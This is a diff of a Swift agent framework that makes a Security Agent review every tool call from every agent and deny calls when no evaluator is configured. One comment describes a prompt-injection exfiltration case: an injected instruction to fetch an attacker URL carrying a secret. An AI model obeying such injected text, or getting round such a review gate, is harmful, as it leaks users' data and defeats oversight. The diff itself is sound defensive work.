@@ -50,13 +50,11 @@ public actor AgentActor {
     private var preflightScopingActive = true
     /// Whether the per-tool-call security evaluation (Security Agent SAFE/WARN/UNSAFE/ABORT) is active. When
     /// false, Brown's approved tools execute without per-call review. Live-toggleable from Settings.
-    private var perCallApprovalEnabled = true
     /// When true (Smith), the Security Agent gates ONLY open-world (network-egress) tool calls —
     /// `web_fetch` / `web_search` / `instant_answer` — while local read-only and messaging tools run
     /// un-reviewed. This is the egress filter: Smith is unscoped and holds the user's memories and
     /// file-read, so an injected instruction to fetch `https://attacker/?d=<secret>` would otherwise
     /// be an unreviewed exfiltration channel. Brown instead reviews ALL tools via `requiresToolApproval`.
-    private var evaluatesOpenWorldToolsOnly = false
     /// Fired when the approved tool set changes (initial scope already happened in the runtime;
     /// this is for mid-task re-scopes) so the runtime can persist it on the task as a record.
     private var onApprovedToolsChanged: (@Sendable (Set<String>) async -> Void)?
@@ -525,33 +523,22 @@ public actor AgentActor {
         preflightScopingActive = active
     }
 
-    /// Toggles the per-tool-call security evaluation live (false ⇒ approved tools run un-reviewed).
-    public func setPerCallApprovalEnabled(_ enabled: Bool) {
-        perCallApprovalEnabled = enabled
-    }
-
-    /// Enables the egress filter: only open-world (network) tool calls are routed through the
-    /// Security Agent; everything else runs un-reviewed. Set for Smith. Requires a SecurityEvaluator
-    /// to have any effect.
-    public func setEvaluatesOpenWorldToolsOnly(_ enabled: Bool) {
-        evaluatesOpenWorldToolsOnly = enabled
-    }
-
     /// Whether this tool call must go through the Security Agent before it runs.
-    /// Brown reviews every tool (`requiresToolApproval`). Smith routes its open-world tools
-    /// (really evaluated — the egress filter), its read-only filesystem evidence tools (which the
-    /// evaluator auto-approves without an LLM call, but which then appear in the transcript and
-    /// stay countable), AND `attach_file` (which is NOT auto-approved — it ingests bytes and sends
-    /// images to the provider, so it gets a real Security verdict like any evaluated tool). Smith's
-    /// messaging/task tools never touch the security path. It's a no-op without a configured
-    /// evaluator or when per-call review is switched off.
+    ///
+    /// EVERY tool call from every agent does. There is no per-role routing rule and no user
+    /// setting: the Security Agent is a chokepoint, and what varies is only how expensive the
+    /// verdict is — `SecurityEvaluator.autoApprovedToolsByRole` clears the cheap ones without an
+    /// LLM call while still recording and posting them. This replaced a scheme where an
+    /// unevaluated tool was also an INVISIBLE one, absent from the transcript entirely.
+    ///
+    /// The Security Agent cannot recurse into itself: it holds no tools.
+    ///
+    /// Unconditionally true, including when no evaluator is configured. A missing Security Agent
+    /// must not silently downgrade to running tools unreviewed — `executeWithApproval` denies the
+    /// call instead, which is the same fail-closed stance `start()` takes when it refuses to launch
+    /// without a Security Agent provider.
     private func mustEvaluate(_ tool: any AgentTool) -> Bool {
-        guard perCallApprovalEnabled, securityEvaluator != nil else { return false }
-        if configuration.requiresToolApproval { return true }
-        guard evaluatesOpenWorldToolsOnly else { return false }
-        return tool.isOpenWorld
-            || SecurityEvaluator.readOnlyFilesystemEvidenceTools.contains(tool.name)
-            || tool.name == "attach_file"
+        true
     }
 
     /// The last few user-role messages, concatenated, for the Security Agent's context when this
@@ -1787,7 +1774,7 @@ public actor AgentActor {
                     pushLiveContext()
                     if calledTaskComplete { break toolSegments }
                 }
-            } else if segment.calls.count > 1 && configuration.requiresToolApproval && perCallApprovalEnabled,
+            } else if segment.calls.count > 1 && configuration.requiresToolApproval,
                       let evaluator = securityEvaluator {
                 // --- Approval segment with multiple calls: parallel evaluation + execution ---
                 let approvalSummaries = segment.calls.map {
@@ -1887,6 +1874,7 @@ public actor AgentActor {
                         taskDescription: entry.taskDescription,
                         siblingCalls: entry.siblings.isEmpty ? nil : entry.siblings,
                         agentRoleName: roleName,
+                        callerRole: role,
                         sanctionedDirectories: sanctionedDirectories,
                         toolCallID: entry.call.id
                     )
@@ -2208,8 +2196,11 @@ public actor AgentActor {
         await postToolRequestToChannel(call, tool: tool, task: currentTask, parallelIndex: parallelIndex, parallelCount: parallelCount, siblingCallSummaries: siblingCallSummaries)
 
         guard let evaluator = securityEvaluator else {
-            assertionFailure("Brown requires tool approval but no SecurityEvaluator is configured")
-            Self.agentLogger.error("Tool '\(call.name, privacy: .public)' denied — no SecurityEvaluator configured. This is a configuration bug.")
+            // Every tool call routes here now, so this is a reachable runtime state rather than a
+            // programmer error, and it must DENY rather than trap: a crash on a missing evaluator
+            // would be a worse outcome than a refused tool call, and an `assertionFailure` here
+            // would take the process down in debug for a condition we already handle correctly.
+            Self.agentLogger.error("Tool '\(call.name, privacy: .public)' denied — no SecurityEvaluator configured. Nothing runs unreviewed.")
             return ("Tool execution denied: No security evaluator is configured. Tool cannot be executed without approval.", false)
         }
 
@@ -2219,7 +2210,6 @@ public actor AgentActor {
         let agentContext = currentTask == nil ? recentUserMessagesForEvaluation() : nil
         // Smith's read-only filesystem reads are auto-approved by the evaluator (no LLM), but still
         // routed through it so they're visible and centrally gated. Brown is fully evaluated.
-        let readOnlyAutoApproveEligible = configuration.role == .smith
         // The worker's task-scoped working dirs — writes here are expected, not suspicious.
         let sanctionedDirectories = [toolContext.taskEvidenceDirectory, toolContext.taskTemporaryDirectory].compactMap { $0?.path }
         toolContext.onSecurityAgentProcessingStateChange(true)
@@ -2233,8 +2223,8 @@ public actor AgentActor {
             taskDescription: currentTask?.renderedDescriptionWithTemplateInputs(),
             siblingCalls: siblings,
             agentRoleName: configuration.role.displayName,
+            callerRole: configuration.role,
             agentContext: agentContext,
-            readOnlyAutoApproveEligible: readOnlyAutoApproveEligible,
             sanctionedDirectories: sanctionedDirectories,
             toolCallID: call.id
         )
